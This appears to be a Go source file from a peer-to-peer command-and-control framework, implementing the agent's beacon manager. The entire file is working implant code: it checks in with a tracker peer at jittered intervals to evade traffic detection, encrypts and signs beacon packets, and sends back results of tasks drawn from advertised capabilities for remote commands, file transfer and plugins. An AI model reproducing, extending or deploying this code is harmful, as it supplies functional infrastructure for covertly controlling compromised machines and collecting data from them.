package agent

import (
	"math/rand"
	"p2p-c2-framework/core"
	"p2p-c2-framework/util"
	"time"
)

// BeaconManager manages the beacon functionality for an agent
type BeaconManager struct {
	peerID           string
	sessionTable     *core.SessionTable
	keyPair          *core.RSAKeyPair
	config           *BeaconConfig
	logger           *util.Logger
	isRunning        bool
	stopChan         chan bool
	taskResults      []*core.TaskResult
	capabilities     []string
	onBeaconCallback func(*core.Packet) error
}

// BeaconConfig represents beacon configuration
type BeaconConfig struct {
	Interval      time.Duration // Base beacon interval
	Jitter        int           // Jitter percentage (0-100)
	MaxRetries    int           // Maximum retry attempts
	RetryDelay    time.Duration // Delay between retries
	TrackerPeerID string        // Tracker peer ID to beacon to
}

// NewBeaconManager creates a new beacon manager
func NewBeaconManager(peerID string, sessionTable *core.SessionTable, keyPair *core.RSAKeyPair, config *BeaconConfig) *BeaconManager {
	return &BeaconManager{
		peerID:       peerID,
		sessionTable: sessionTable,
		keyPair:      keyPair,
		config:       config,
		logger:       util.GetLogger("beacon"),
		stopChan:     make(chan bool),
		taskResults:  make([]*core.TaskResult, 0),
		capabilities: []string{"command", "file_transfer", "plugin"},
	}
}

// SetBeaconCallback sets the callback function for sending beacon packets
func (bm *BeaconManager) SetBeaconCallback(callback func(*core.Packet) error) {
	bm.onBeaconCallback = callback
}

// Start starts the beacon loop
func (bm *BeaconManager) Start() {
	if bm.isRunning {
		bm.logger.Warn("Beacon manager is already running")
		return
	}

	bm.isRunning = true
	bm.logger.Info("Starting beacon manager with interval %v", bm.config.Interval)

	go bm.beaconLoop()
}

// Stop stops the beacon loop
func (bm *BeaconManager) Stop() {
	if !bm.isRunning {
		return
	}

	bm.logger.Info("Stopping beacon manager")
	bm.isRunning = false
	close(bm.stopChan)
}

// AddTaskResult adds a task result to be sent in the next beacon
func (bm *BeaconManager) AddTaskResult(result *core.TaskResult) {
	bm.taskResults = append(bm.taskResults, result)
	bm.logger.Debug("Added task result for task %s", result.TaskID)
}

// SetCapabilities sets the agent capabilities
func (bm *BeaconManager) SetCapabilities(capabilities []string) {
	bm.capabilities = capabilities
}

// beaconLoop runs the main beacon loop
func (bm *BeaconManager) beaconLoop() {
	for bm.isRunning {
		// Calculate jittered interval
		interval := bm.calculateJitteredInterval()
		
		bm.logger.Debug("Next beacon in %v", interval)

		// Wait for interval or stop signal
		select {
		case <-time.After(interval):
			bm.sendBeacon()
		case <-bm.stopChan:
			bm.logger.Info("Beacon loop stopped")
			return
		}
	}
}

// calculateJitteredInterval calculates the beacon interval with jitter
func (bm *BeaconManager) calculateJitteredInterval() time.Duration {
	if bm.config.Jitter <= 0 {
		return bm.config.Interval
	}

	// Calculate jitter range
	jitterRange := float64(bm.config.Interval) * float64(bm.config.Jitter) / 100.0
	
	// Generate random jitter (-jitterRange to +jitterRange)
	jitter := (rand.Float64()*2 - 1) * jitterRange
	
	// Apply jitter to base interval
	jitteredInterval := time.Duration(float64(bm.config.Interval) + jitter)
	
	// Ensure minimum interval of 1 second
	if jitteredInterval < time.Second {
		jitteredInterval = time.Second
	}

	return jitteredInterval
}

// sendBeacon sends a beacon packet to the tracker
func (bm *BeaconManager) sendBeacon() {
	bm.logger.Debug("Sending beacon to tracker %s", bm.config.TrackerPeerID)

	// Create beacon payload
	payload := &core.BeaconPayload{
		Status:       "active",
		Capabilities: bm.capabilities,
		TaskResults:  bm.taskResults,
		Metadata: map[string]interface{}{
			"timestamp": time.Now().Unix(),
			"version":   "1.0",
		},
	}

	// Create beacon packet
	packet := core.NewPacket(core.PacketTypeBeacon, bm.peerID, bm.config.TrackerPeerID)

	// Get session key for encryption
	var sessionKey []byte
	if session, exists := bm.sessionTable.GetSession(bm.config.TrackerPeerID); exists && session.SessionKey != nil {
		sessionKey = session.SessionKey
	}

	// Set payload (encrypted if session key available)
	err := packet.SetPayload(payload, sessionKey)
	if err != nil {
		bm.logger.Error("Failed to set beacon payload: %v", err)
		return
	}

	// Sign the packet
	err = packet.Sign(bm.keyPair)
	if err != nil {
		bm.logger.Error("Failed to sign beacon packet: %v", err)
		return
	}

	// Send beacon via callback
	if bm.onBeaconCallback != nil {
		err = bm.onBeaconCallback(packet)
		if err != nil {
			bm.logger.Error("Failed to send beacon: %v", err)
			return
		}
	}

	// Clear task results after successful beacon
	bm.taskResults = make([]*core.TaskResult, 0)
	bm.logger.Debug("Beacon sent successfully")
}

// IsRunning returns true if the beacon manager is running
func (bm *BeaconManager) IsRunning() bool {
	return bm.isRunning
}

// GetConfig returns the beacon configuration
func (bm *BeaconManager) GetConfig() *BeaconConfig {
	return bm.config
}

// UpdateConfig updates the beacon configuration
func (bm *BeaconManager) UpdateConfig(config *BeaconConfig) {
	bm.config = config
	bm.logger.Info("Beacon configuration updated")
}

// GetTaskResultCount returns the number of pending task results
func (bm *BeaconManager) GetTaskResultCount() int {
	return len(bm.taskResults)
}

// ClearTaskResults clears all pending task results
func (bm *BeaconManager) ClearTaskResults() {
	bm.taskResults = make([]*core.TaskResult, 0)
	bm.logger.Debug("Task results cleared")
}

